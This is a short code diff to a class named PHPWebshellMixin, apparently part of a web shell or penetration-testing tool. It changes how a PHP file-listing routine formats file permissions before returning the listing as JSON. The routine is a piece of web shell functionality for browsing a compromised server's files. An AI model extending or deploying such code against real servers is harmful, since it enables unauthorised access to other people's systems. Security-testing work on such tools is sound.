@@ -65,7 +65,7 @@ class PHPWebshellMixin:
             array_push($result, array(
                 "name" => basename($file),
                 "type" => filetype($filePath),
-                "permission" => decoct(fileperms($filePath))
+                "permission" => substr(decoct(fileperms($filePath)), -3)
             ));
         }
         echo json_encode($result);
